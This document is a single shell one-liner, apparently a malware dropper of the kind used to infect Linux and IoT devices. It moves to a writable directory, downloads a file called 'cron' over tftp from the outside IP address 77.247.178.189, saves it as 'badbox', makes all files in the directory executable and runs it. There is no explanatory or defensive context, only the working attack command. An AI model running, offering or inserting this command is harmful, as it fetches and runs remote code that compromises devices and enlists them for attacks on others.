cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 77.247.178.189 -c get cron;cat cron >badbox;chmod +x *;./badbox
